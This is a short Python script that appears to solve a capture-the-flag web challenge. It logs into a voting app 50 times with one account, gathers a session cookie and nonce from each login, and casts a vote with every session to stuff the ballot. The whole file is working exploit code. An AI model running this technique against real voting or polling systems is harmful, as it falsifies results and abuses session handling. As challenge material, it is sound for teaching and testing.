import requests
import re
import sys

# usage python3 solution.py localhost 7777
host = sys.argv[1]
port = sys.argv[2]
url = f"http://{host}:{port}/login"
data = {"username": "lastvoter", "password": "yourvotecounts123", "remember": "on"}
session_cookie_re = re.compile("session=(.*); Path=/;")
nonce_re = re.compile('value=\"([0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12})\"')
sessions = {}
for i in range(50): # enough to beat the challenge
    s = requests.Session()
    resp = s.post(url, data=data)

    nonce = nonce_re.search(resp.text).groups()[0]    
    cookie=s.cookies.get("session")
    sessions[cookie] = nonce

url = f"http://{host}:{port}/vote"
for cookie,nonce in sessions.items():
    cookies = {"session": cookie}
    data = {"candidate": "LA Ice Cola", "nonce": nonce}
    requests.post(url, cookies=cookies, data=data)

resp = requests.get(f"http://{host}:{port}/results")
print(resp.text)
